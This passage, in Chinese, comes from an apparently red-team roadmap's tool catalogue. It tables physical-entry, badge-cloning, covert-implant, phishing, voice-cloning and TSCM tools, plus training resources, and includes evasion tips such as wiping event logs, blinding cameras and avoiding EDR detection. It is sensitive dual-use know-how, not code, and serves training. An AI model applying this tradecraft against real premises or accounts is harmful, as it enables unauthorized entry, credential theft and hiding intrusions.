| **Under-Door Tool (UDT)** | `COMMERCIAL`（约 $40） | https://covertinstruments.com | 柔性弹簧钢丝杠杆绕过工具，可从商用室内门下方伸入，向下拉动门内侧的逃生杠杆把手。 |
| **Air Wedges & Long-Reach Tools** | `COMMERCIAL`（约 $35） | 汽车 / 隐蔽进入器材供应商 | 可充气的弹道尼龙气囊与刚性长杆，用于在不破坏门体的前提下撑开门缝，以触发门内的逃生横杆或把手。 |
| **Traveler Hook & Shove Knives** | `COMMERCIAL`（约 $15-$25） | Covert Instruments / Sparrows | 高抗拉弹簧钢工具，用于操纵外部门锁扣，以及在向外开启的门上使用。 |
| **Tubular Lock Picks** | `COMMERCIAL`（约 $40-$80） | SouthOrd / Multipick | 7 针与 8 针管状锁开锁解码器，用于打开报警面板、服务器机柜与钥匙保管箱。 |
| **Lishi Decoders (SC1 / KW1 2-in-1)** | `COMMERCIAL`（约 $60-$90/个） | 专业锁匠供应商 | 面向 Schlage 与 Kwikset 弹子锁芯的精密 2 合 1 解码与开锁工具。可在 60 秒内完成开锁，同时解出精确的钥匙齿深。 |

---

### 🚪 电子门禁与工牌利用

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Proxmark3 RDV4 (Iceman Firmware)** | `FREE (hardware)`（约 $80-$300） | https://github.com/RfidResearchGroup/proxmark3 | RFID 与 NFC 研究的标杆工具。可嗅探、读取、克隆并模拟低频 125kHz（HID Prox、Indala、EM4100）与高频 13.56MHz（MIFARE Classic、Plus、Ultralight、iCLASS）。 |
| **Flipper Zero** | `FREE (hardware)`（约 $169） | https://flipperzero.one | 便携多功能工具，可现场嗅探、保存并重放 125kHz RFID 门禁工牌、Sub-GHz 道闸遥控与红外遥控。 |
| **Chameleon Ultra** | `FREE (hardware)`（约 $120） | https://github.com/RfidResearchGroup/ChameleonUltra | 专用高性能 RFID 工牌模拟器与嗅探器，可同时支持 8 个低频与 8 个高频卡槽。 |
| **T5577 & Magic MIFARE Rewritable Cards** | `FREE (hardware)`（约 $1-$2/个） | 专业 RFID 供应商 | 双频可重写凭据坯卡（125kHz 用 T5577，13.56MHz 用 Gen1a/Gen2/Gen4 Magic 卡），用于写入克隆的工牌身份。 |
| **ESPKey / Wiegand Sniffer** | `OSS`（硬件约 $25） | https://github.com/octosql/espkey | 超紧凑微芯片，串接安装在外置读卡器背后，通过 Wi-Fi 记录并传输原始 Wiegand 工牌数据。 |
| **osdp-tool** | `OSS` | https://github.com/ezforever/osdp-tool | 运行在 RS-485 读卡器到控制器总线上的开放监督设备协议（OSDP）的帧解析器与协议分析器。 |
| **REX Sensor Bypass Tools** | `FREE`（硬件约 $10） | 本地五金店 | 罐装倒置压缩空气（制造温差以触发 PIR 传感器）、钢丝套索工具与蒸汽笔，用于触发“请求离开”（REX）移动探测器。 |

---

### 👁️ 反监视与隐蔽物理侦察

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **850nm / 940nm High-Power IR Illuminators** | `COMMERCIAL`（约 $20-$45） | 光学器材供应商 | 红外 LED 手电，用不可见红外辐射灌满 CMOS 摄像头传感器，在低光环境下致盲镜头而不惊动人员。 |
| **10x-30x Optical Monocular** | `COMMERCIAL`（约 $50-$120） | Vortex / Celestron | 紧凑的多层镀膜光学单筒望远镜，用于远距离物理侦察：守卫换班、门五金识别，以及从背后肩窥 PIN 输入。 |
| **DJI Mini 4 Pro / Air 3** | `COMMERCIAL`（约 $759+） | https://www.dji.com | 250g 以下的超静音侦察无人机，配 4K 长焦相机，用于空中现场测绘、屋顶进入评估与围栏检查。 |
| **DJI Matrice 30T / Radiometric Thermal Drone** | `COMMERCIAL`（约 $9,000+） | 企业级无人机供应商 | 企业级热成像无人机，提供辐射测温热图，用于发现巡逻中的守卫、机房 HVAC 排风口与夜间人员活动。 |
| **PVC Card Printers (Fargo / Evolis)** | `COMMERCIAL`（约 $800-$2,500） | Fargo / Evolis | 高清染料升华 PVC 证件卡打印机，用于制作企业访客牌、承包商通行证与检查证件的视觉复制品。 |

---

### 🔌 隐蔽硬件植入体与现场投放盒

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Hak5 LAN Turtle** | `COMMERCIAL`（约 $60） | https://hak5.org | 隐蔽的 USB 转以太网植入体，插在工作站背后即可提供自动化远程访问、DNS 欺骗与反向 SSH / WireGuard 隧道。 |
| **Hak5 Shark Jack** | `COMMERCIAL`（约 $100） | https://hak5.org | 紧凑形态的便携网络评估工具，用于自动化的在线以太网侦察与载荷投放。 |
| **Hak5 WiFi Pineapple** | `COMMERCIAL`（约 $120-$200） | https://hak5.org | 无线审计平台，用于自动化部署流氓 AP、karma 攻击与凭据收集。 |
| **Raspberry Pi Zero 2W / CM4 Custom Dropbox** | `FREE (hardware)`（约 $50-$120） | 自行组装 | 低可见度的 Linux 投放盒，配 4G/LTE USB 模块、外置高增益 Wi-Fi 与 WireGuard 隧道，用于无人值守的内网访问。 |
| **O.MG Cable / KeyCropper** | `COMMERCIAL`（约 $120-$180） | https://o-mg.tech | 恶意 USB 线缆，内藏 802.11 Wi-Fi 微控制器，用于无线按键注入、载荷投放与硬件键盘记录。 |
| **Chisel (jpillora)** | `OSS` | https://github.com/jpillora/chisel | 通过 SSH 加固、跑在 HTTP 之上的快速 TCP/UDP 反向隧道工具。部署在隐蔽现场投放盒上，直接向内网子网提供加密 SOCKS5 跳板。 |
| **WireGuard** | `OSS` | https://www.wireguard.com | 现代高性能内核级加密 UDP 隧道（端口 51820）。作为现场投放盒与云重定向器之间的主要带外反向 C2 通道。 |

---

### 🎭 社会工程、诱导与语音钓鱼

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **GoPhish** | `OSS` | https://github.com/gophish/gophish | 开源钓鱼框架，用于编排企业邮件钓鱼演练、落地页与凭据跟踪。 |
| **Evilginx3** | `OSS` | https://github.com/kgretzky/evilginx2 | 高级反向代理钓鱼框架，通过实时收割会话认证 cookie 绕过 MFA。 |
| **Asterisk / Twilio VoIP Stacks** | `OSS` / `COMMERCIAL` | https://www.asterisk.org / https://www.twilio.com | 可配置的 PBX 与 SIP 电话基础设施，支持经授权的来电显示伪造与录音，用于结构化的语音钓鱼话术。 |
| **ElevenLabs Voice Cloning** | `COMMERCIAL` | https://elevenlabs.io | 高保真语音合成引擎，用于克隆音色与语速节奏，服务于定向社会工程电话测试。 |
| **MicroSIP / Linphone** | `OSS` | https://www.microsip.org / https://www.linphone.org | 轻量 SIP/VoIP 软电话，操作者用它接入本地 Asterisk PBX 实例与 Twilio SIP 中继，进行实时语音钓鱼与话术诱导。 |
| **OSINT Profiling Stack (holehe, PhoneInfoga, Sherlock, Maltego)** | `OSS` | GitHub / Paterva | 用于绘制企业组织结构、识别在职员工邮箱、电话运营商与关联社交资料的工具，服务于话术铺垫。 |

---

### ⚛️ 2027 量子计算与后量子密码（PQC）

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **liboqs (Open Quantum Safe)** | `OSS` | https://github.com/open-quantum-safe/liboqs | 实现 NIST PQC 标准（ML-KEM、ML-DSA、Falcon、SPHINCS+）的抗量子密码算法 C 库。 |
| **OQS-OpenSSL3** | `OSS` | https://github.com/open-quantum-safe/oqs-provider | OpenSSL 3.x 提供者，把抗量子密钥交换与数字签名算法集成到标准 TLS 连接中。 |
| **Dumpcap / Arkime (Moloch)** | `OSS` | https://arkime.com | 高性能原始数据包索引与捕获平台，用于“先存储后解密”（SNDL）的加密流量收割。 |
| **pq-crystals Reference Implementations** | `OSS` | https://github.com/pq-crystals | CRYSTALS-Kyber 与 CRYSTALS-Dilithium 的官方参考代码库，用于侧信道时序分析与实现审计。 |
| **testssl.sh / sslyze** | `OSS` | https://testssl.sh / https://github.com/nabla-c0d3/sslyze | TLS 配置审计工具，可识别遗留的 RSA/ECC 密码套件、混合后量子密码套件与 TLS 降级风险。 |

---

### 📡 技术监视对抗（TSCM）

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **RF Explorer 6G Combo** | `COMMERCIAL`（约 $350-$400） | https://www.rf-explorer.com | 手持数字射频频谱分析仪，覆盖 15MHz 至 6.1GHz，用于识别未授权的射频发射器、模拟窃听器与 GSM 突发信号。 |
| **HackRF One + PortaPack H2 (Mayhem)** | `COMMERCIAL`（约 $150-$250） | https://greatscottgadgets.com/hackrf/ | 便携宽带 SDR 收发器，带机载频谱瀑布图显示，用于扫频并捕获原始监视窃听器发射信号。 |
| **ORION 2.4 / REI Non-Linear Junction Detector** | `COMMERCIAL`（约 $12,000-$25,000） | Research Electronics International (REI) | 顶级非线性结探测器（NLJD），发射射频能量并检测二、三次谐波回波，从而定位硅半导体 —— 无论发射器是通电还是休眠。 |
| **SpyFinder PRO / Optical Lens Detectors** | `COMMERCIAL`（约 $150-$300） | Spy Associates / REI | 超亮脉冲 LED 阵列配专用光学观察滤镜，通过回射效应揭示隐藏的针孔摄像头镜头。 |
| **InfiRay P2 Pro / FLIR ONE Thermal Cameras** | `COMMERCIAL`（约 $250-$400） | InfiRay / FLIR | 高灵敏度微型热像仪，插入智能手机即可检测隐藏发射器与隐蔽窃听设备产生的热特征。 |

---

### 📋 红队行动、治理与报告

| 工具 | 许可证 | 链接 / 安装 | 功能说明 |
|------|---------|----------------|--------------|
| **Ghostwriter** | `OSS` | https://github.com/GhostManager/Ghostwriter | SpecterOps 出品的企业级红队项目管理平台：跟踪行动日志、攻击链、证据，并自动生成 Word 报告。 |
| **PlexTrac** | `COMMERCIAL` | https://plextrac.com | 集中式网络安全报告平台，用于撰写红队发现、映射到 MITRE ATT&CK，并管理实时修复跟踪。 |
| **TIBER-EU & CBEST Frameworks** | `FREE` | 欧洲央行 / 英格兰银行 | 监管框架与指南，定义面向关键金融与国家基础设施的“威胁情报主导的道德红队”标准。 |
| **Post-Engagement Cleanup Scripts** | `OSS` | 项目专用 / GitHub | 自定义的自动化 PowerShell 与 Bash 脚本，用于回滚持久化机制、删除投放的植入体，并清理 Windows Sysmon 与事件日志。 |

---

<a id="practice-platforms"></a>
## 练习平台

> 不练就学不会漏洞利用。每天使用这些平台。
> 阶段 0–2：TryHackMe → HackTheBox。阶段 3+：HTB、pwn.college、CTF。

| 平台 | 许可证 | 链接 | 最适合 |
|----------|---------|------|----------|
| **HackTheBox** | `FREEMIUM`（约 $14/月 VIP） | https://hackthebox.com | 完整的漏洞利用学习路径。免费档足以起步。VIP 可解锁带通关教程的退役靶机。Pro Labs（Offshore、RastaLabs）是任何地方能拿到的最好的 AD 练习环境。 |
| **TryHackMe** | `FREEMIUM`（约 $14/月） | https://tryhackme.com | 最好的引导式入门内容。每个阶段都有学习路径。阶段 0 从这里开始。浏览器直接访问实验环境。 |
| **PortSwigger Web Academy** | `FREE` | https://portswigger.net/web-security | 现有最好的免费 Web 安全学习资源。每个 OWASP 类别都有实验，还覆盖进阶主题（HRS、SSTI、JWT、OAuth、原型链污染）。把每个实验都做一遍。 |
| **pwn.college** | `FREE` | https://pwn.college | ASU 支持的结构化二进制漏洞利用课程。从 shellcode 到内核利用的模块。最好的免费二进制漏洞利用资源。 |
| **pwnable.kr** | `FREE` | https://pwnable.kr | 二进制漏洞利用题目。经典题：`fd`、`collision`、`bof`、`flag`、`passcode`。阶段 3 必修练习。 |
| **OverTheWire** | `FREE` | https://overthewire.org | Linux 与 Web 的 war game。先用 `Bandit` 打 Linux 命令行基础。`Narnia` 与 `Natas` 练漏洞利用基础。 |
| **PicoCTF** | `FREE` | https://picoctf.org | 卡内基梅隆大学的 CTF。分类对初学者友好。适合阶段 0–1 练习。 |
| **VulnHub** | `FREE` | https://vulnhub.com | 可下载的易受攻击虚拟机。可离线练习。难度层次丰富。 |
| **PwnTillDawn** | `FREEMIUM` | https://online.pwntilldawn.com | 聚焦 AD 的实验环境。知名度较低，但当 HTB Pro Labs 太贵时，它是极好的 AD 练习选择。 |
| **Hack The Box Pro Labs** | `COMMERCIAL`（约 $49–$99/月） | https://hackthebox.com/hacker/pro-labs | **Offshore**（多域企业 AD）、**RastaLabs**（钓鱼 + AD）、**APTLabs**（国家级 TTP）。现有最好的 AD 红队练习环境。 |

---

<a id="essential-resources"></a>
## 必备资源

### 📚 参考数据库

| 资源 | 链接 | 说明 |
|----------|------|-----------|
| **PayloadsAllTheThings** | https://github.com/swisskyrepo/PayloadsAllTheThings | 覆盖各类攻击的载荷与绕过合集。查载荷语法的第一站。 |
| **HackTricks** | https://book.hacktricks.xyz | 内容极其丰富的攻防技术 wiki。从 Web 到硬件到云，都带示例。 |
| **GTFOBins** | https://gtfobins.github.io | Unix 二进制利用参考。 |
| **LOLBAS** | https://lolbas-project.github.io | Windows LOLBAS 参考。 |
| **LOLDrivers** | https://www.loldrivers.io | 已签名的易受攻击 Windows 驱动数据库。 |
| **Exploit-DB** | https://www.exploit-db.com | 公开漏洞利用仓库。`searchsploit` 命令行工具用的就是这个库。 |
| **MITRE ATT&CK** | https://attack.mitre.org | 对手战术与技术矩阵。写报告时把你的攻击映射到这里。 |
| **PortSwigger Research** | https://portswigger.net/research | James Kettle 的 Web 安全研究。HTTP RS、缓存投毒、请求隧道 —— 源头就在这里。 |
| **SpecterOps Blog** | https://posts.specterops.io | 最重要的 AD/身份攻击研究博客。订阅它。 |
| **Malpedia** | https://malpedia.caad.fkie.fraunhofer.de | 恶意软件家族参考。了解威胁行为体都会投放什么。 |

### 🎓 必读书目（按阶段排序）

| 书名 | 作者 | 阶段 | 备注 |
|------|--------|-------|-------|
| The C Programming Language | Kernighan & Ritchie | 阶段 0 | 先读这本。K&R 的 C 仍是最好的 C 入门。 |
| Operating Systems: Three Easy Pieces | Arpaci-Dusseau | 阶段 0 | 免费：https://ostep.org —— 并发、内存、持久化 |
| The Linux Programming Interface | Kerrisk | 阶段 0 | 深入 Linux。有关进程、信号、套接字、内存的章节。 |
| Hacking: The Art of Exploitation (2nd ed) | Erickson | 阶段 1–3 | 把 shellcode 介绍给一代人的书。至今仍然有效。 |
| The Shellcoder's Handbook | Anley et al. | 阶段 3 | 栈溢出、堆溢出、格式化字符串。动手做阶段 3 之前先读它。 |
| Practical Binary Analysis | Andriesse | 阶段 3 | 免费 PDF。ELF 内部结构、动态插桩、污点分析。 |
| A Guide to Kernel Exploitation | Perla & Oldani | 阶段 3–4E | Linux 内核漏洞利用。标准参考。 |
| Hacking APIs | Corey Ball | 阶段 1 | 最好的 API 安全测试书。内容跟得上现状。 |
| Windows Internals (Part 1 + 2) | Russinovich et al. | 阶段 4 | Windows 内部究竟如何运作。阶段 4A–4E 必备。 |
| Windows Kernel Programming | Yosifovich | 阶段 4E | 编写 Windows 内核驱动。攻击它们之前先学会写。 |
| Practical Malware Analysis | Sikorski & Honig | 阶段 4A | 标准的恶意软件分析教材。 |
| Rootkits and Bootkits | Matrosov et al. | 阶段 4E | rootkit 与 UEFI bootkit 的历史与实现。这个主题上唯一的一本书。 |
| The Fuzzing Book | Zeller et al. | 阶段 3–4D | 免费：https://www.fuzzingbook.org —— 模糊测试的理论与实践。 |
| Red Team Development and Operations | Vest | 阶段 4 | 企业红队行动方法论。 |

### 🎥 YouTube 频道（2027 年仍在更新）

| 频道 | 关注方向 | 链接 |
|---------|-------|------|
| LiveOverflow | 二进制漏洞利用、Web、CTF 方法论 | https://youtube.com/@LiveOverflow |
| ippsec | HackTheBox 靶机通关讲解 | https://youtube.com/@ippsec |
| John Hammond | CTF、恶意软件分析、安全新闻 | https://youtube.com/@_JohnHammond |
| TCM Security | 实战渗透测试、AD 攻击 | https://youtube.com/@TCMSecurityAcademy |
| stacksmashing | 硬件、固件、嵌入式、NFC | https://youtube.com/@stacksmashing |
| HuskyHacks | Active Directory 攻击、Cobalt Strike | https://youtube.com/@HuskyHacks |
| VX-Underground | 恶意软件、威胁行为体研究 | https://youtube.com/@vxunderground |
| OALabs | 恶意软件分析、脱壳、逆向 | https://youtube.com/@oalabs |
| STÖK | 漏洞赏金方法论、侦察 | https://youtube.com/@STOKfredrik |
| DEF CON | 会议演讲、前沿研究 | https://youtube.com/@DEFCONConference |
| Black Hat | 专业攻防研究 | https://youtube.com/@BlackHatOfficialYT |
| pwn.college | 结构化二进制漏洞利用课程 | https://youtube.com/@pwncollege |

### 📋 课程（2027）

| 课程 | 提供方 | 费用 | 何时学 |
|--------|----------|------|--------------|
| PEN-200 (OSCP) | Offensive Security | 约 $1,499 | 阶段 2 之后。入门级认证。 |
| PEN-300 (OSEP) | Offensive Security | 约 $1,499 | 阶段 4 水平。规避 + AD。 |
| EXP-301 (OSED) | Offensive Security | 约 $1,499 | 阶段 3–4。Windows 漏洞利用开发。 |
| CRTO (Red Team Ops) | ZeroPointSecurity | 约 $500 | 阶段 4B。Cobalt Strike + AD。 |
| CRTE | Altered Security | 约 $400 | 阶段 4I 深度内容。AD 攻击。 |
| Sektor7 Maldev | Sektor7 | 约 $150 | 阶段 4A 起点。最好的恶意软件开发入门。 |
| Maldev Academy | Maldev Academy | 约 $500/年 | 阶段 4A–4C 全面课程。 |
| TCM Practical Ethical Hacking | TCM Security | 约 $30 | 阶段 0–2。性价比最高的入门课。 |

---

<a id="deprecated-stack"></a>
## ❌ 已废弃工具栈 —— 请勿使用

> 这些工具已确认停更、无人维护，或已被取代。
> 不要安装它们。不要盲从推荐它们的教程 —— 先对照本清单。

| ❌ 已死工具 | ✅ 改用 | 淘汰原因 |
|------------|--------------|---------|
| **CrackMapExec (CME)** | **NetExec (nxc)** | 上游已死。无活跃开发。NetExec 是仍在维护的直接分叉。 |
| **Cuckoo Sandbox** | **CAPE Sandbox / Tria.ge** | 已无人维护。Python 2 依赖链已断裂。CAPE 是仍在延续的分支。 |
| **Evilginx2** | **Evilginx3** | 旧版本存在已知检测特征。请用 Evilginx3（同一仓库，更新的 tag/release）。 |
| **MSOLSpray** | **CredMaster** | 会被现代 Microsoft 检测捕获。CredMaster 用 FireProx（AWS API Gateway）做 IP 轮换。 |
| **LocalMonero** | **Haveno** | LocalMonero 于 2024 年 11 月永久关停。Haveno 是 P2P 替代方案。 |
| **gobuster（用于递归）** | **feroxbuster** | 不递归。feroxbuster 基于 Rust，默认递归，更快。只有在你确实需要单次非递归扫描时才用 gobuster。 |
| **dirb / dirbuster** | **ffuf 或 feroxbuster** | 古老、缓慢、噪声大。ffuf 快 10 倍且更灵活。 |
| **Mimikatz（直接投放）** | **nanodump / lsassy / pypykatz** | Mimikatz 会被每个 EDR 与 AV 产品捕获。仅用于学习与实验环境。绝不要直接对已部署防御的系统使用。用 nanodump 转储，用 pypykatz 离线解析。 |
| **BloodHound（旧版）** | **BloodHound CE** | 旧版 BloodHound 已不再维护。BloodHound Community Edition（SpecterOps）是仍在活跃开发的当前版本。 |
| **Metasploit（作为主力 C2）** | **Sliver / Havoc** | Meterpreter 的 EDR 检测率极高。Metasploit 在利用模块与载荷生成上仍有价值，但不适合作为已部署防御环境中的 C2。 |
| **PowerSploit (Invoke-Mimikatz)** | **Rubeus / nanodump** | PowerShell 的 AMSI + 日志会捕获它。改用 C# 工具（Rubeus）或直接系统调用方案。 |
| **Empire（原版）** | **Sliver / Havoc** | 原版 Empire 框架已死。BC-Security 的分叉仍在，但检测率很高。 |
| **Covenant** | **Sliver / Havoc** | 开发已停止。检测率高。 |
| **BeEF** | **现代 AiTM（Evilginx3）** | 浏览器利用框架对现代浏览器已基本过时。通过 AiTM 窃取 cookie 更有效。 |
| **Searchsploit（单独使用）** | **nuclei + 人工 CVE 研究** | Searchsploit 数据库在版本之间会陈旧。可作快速参考，但要用 NVD/GitHub 核对当前可用的 PoC。 |

---

<div align="right">

*工具清单 —— The BlackHAT Roadmap v1.2.2 · 权威 2027 版*<br/>
*作者：Sagar Biswas（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)） · 规范仓库：https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap*<br/>
*精选生态：[Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [渗透测试路线图](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)*<br/>
*依据 Creative Commons Attribution-ShareAlike 4.0 International（CC BY-SA 4.0）授权*<br/>
*覆盖范围：阶段 -1 至阶段 6 · 约 270 款工具 · 所有 URL 均已核验 · 不含已废弃工具*

</div>

---